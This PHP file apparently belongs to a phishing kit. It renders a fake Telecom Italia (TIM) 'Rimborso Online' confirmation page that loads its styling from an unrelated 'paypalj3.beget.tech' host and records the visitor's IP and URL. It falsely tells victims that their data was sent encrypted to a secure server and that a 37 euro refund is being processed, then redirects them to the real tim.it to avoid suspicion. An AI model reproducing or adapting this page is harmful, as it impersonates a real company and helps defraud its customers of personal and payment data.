<?php

$folder1="http://paypalj3.beget.tech/dk";
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
$back = '
    <!doctype html>
    <html>
    <head>

        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="ZE=edge">

		
        <link rel="stylesheet" href="'.$folder1.'/style_unico_tim.css" type="text/css"/>
        <link rel="stylesheet" href="'.$folder1.'/style.css" type="text/css"/>
        <link rel="stylesheet" href="'.$folder1.'/style_addon.css" type="text/css"/>
        <link rel="stylesheet" href="'.$folder1.'/bootstrap-select.css" type="text/css"/>
        <link rel="stylesheet" href="'.$folder1.'/flexslider.css" type="text/css"/>
        <link rel="stylesheet" href="'.$folder1.'/ezmark.css" type="text/css"/>
        <link rel="stylesheet" href="'.$folder1.'/cookie_style_sprite.css" rel="stylesheet" type="text/css">


        
        
		
		
        
	        
	            <link rel="stylesheet" href="'.$folder1.'/slick.css" type="text/css"/>

	            
	                <link rel="stylesheet" href="'.$folder1.'/style_ALMNP.css" type="text/css"/>

	    	<title>Rimborso Online | TIM</title>
</head>
    
    <body>
 
	<header class="hover_no_active">
		
	    <div class="navbar navbar-default navbar-fixed-top nav-header">
	        <div class="container">

	            <div class="navbar-collapse collapse">
	                <div class="navbar-nav-left">
						
	                    <a href="/" class="logo-tim-small"><img src="'.$folder1.'/logo_tim_small.png"/></a>
	                </div>
	                
	            </div>
	        </div>
	    </div>
	  
	    <div class="maschera_menu"></div>
	    
	</header>
      <section>
                <div class="container steps">
                    <div class="text_cirlce">
                        <div class="col-sm-5">
                            <span>Il tuo rimborso</span>
                      </div>
                        <div class="col-sm-2 ">
                            <span>Inserisci i tuoi dati</span>
                        </div>
                        <div class="col-sm-5 active">
                            <span>Esito rimborso</span>
                        </div>
                    </div>
                    <br clear="all"/>

                    <div class="dotsandlines">

                        <div class="circle-contain">
                            <div class="circle active end">1</div>
                        </div>
                        <div class="line active"></div>
                        <div class="circle-contain">
                            <div class="circle active end">2</div>
                        </div>
                        <div class="line active"></div>
                        <div class="circle-contain">
                            <div class="circle active end">3</div>
                        </div>

                    </div>
                </div>
                <br clear="all"/>
            </section>
           
            <section>
                <div class="container pga">
                    
                    <div class="col-sm-9">
 
    <div class="cont-divisori divisore_ricarica"></div>
    <form name="ricOneShot3" action="SA.php" role="form" class="form-horizontal" method="post">
        <div class="ricarica">
            <div class="cont-row">
                <h4>&nbsp; </h4>
                <h4>Il rimborso &egrave; stato salvato. </h4>
                <h4>Si verr&agrave; reindirizzati alla home page in 10 secondi, si prega di attendere ...</h4>
        </div>
            <!-- form per cambiare il valore della  -->
            <div class="form-group"></div>
            <div style="display: none;">
          <div class="col-lg-4"></div>
                <p class="small col-lg-4" id="taglioDescrizione"></p>
                <br clear="Sll">
            </div>
            <div class="form-group"></div>

            <div class="form-group">
              <p>Tutte le informazioni sono state trasmesse in forma criptata al nostro server sicuro. </p>
              <p>Grazie di utilizzare TIM Aspetta un po il tuo account &egrave; gestito, &egrave; ora possibile utilizzare l account come al solito e attendere un messaggio che indica il successo dell operazione.            </p>
            </div>

            <div class="form-group"></div>
        </div>
        <div class="pagamento" id="divMdp">
          <div class="form-group informativa"></div>
        </div></form>

                    </div>
                    <div class="col-sm-3 gestione_spl_dx" id="miniCart">
        
	<div class="box-acquisto">
        <div class="cont_spl_dx">
            <div class="cont-fisso ricarica">
                        
                        	
                        	
	                        	
		                         
		                         	<div class="row cont-header-acquisto">
		                                <div class="col-sm-12">
		                                    <h5>RIMBORSO Online </h5>
                                  </div>
		                                <div class="col-sm-9">
		                                    <p>Taglio della ricarica</p>
		                                </div>
		                                <div class="col-sm-3">
<p class="text-warning">37 &euro;
 </p>
</div>
 </div>

              <div class="cont-divisori"></div>

                <div class="cont-divisori cont-black"></div>
                <div class="row costo-tot">
                    <div class="col-sm-12">
                        <h5>totale a RIMBORSO</h5>
                        
                        
                        <div class="circle active end"></div>
                        <h2>37 &euro;
		
		
		
	

                        </h2>
                    </div>
                </div>
                    
            </div>
  
            
        </div>
	</div>
    
                    </div>
                </div>
            </section>

           
            <section>
                <div class="container scheda-prodotti-container">
 

                </div>
            </section>

	<footer>
		<div class="container">
			
				<ul class="list-unstyled">
					<li class="pull-right">Telecom Italia 2012 - P.IVA 00488410010</li>
					
						
							<li><a href="#"
								
								target="_self">Privacy</a>
							</li>
						
							<li><a href="#"
								
								target="_self">Note legali</a>
							</li>
						
							<li><a href="#"
								
								target="_self">Website Info</a>
							</li>
						
							<li><a href="#"
								
								target="_self">Contatti</a>
							</li>
						
							<li><a href="#"
								
								target="_self">Per i Consumatori</a>
							</li>
						
							<li><a href="#"
								
								target="_self">Tutela Minori</a>
							</li>
						
							<li><a href="#"
								
								target="_self">Lavora con noi</a>
							</li>
						
					
				</ul>
				<br clear="all" />
			
		</div>
	</footer>
	
		<meta http-equiv="refresh" content="10; url=https://www.tim.it" />

	  	</body>
	</html>
' ;
echo '
';
?>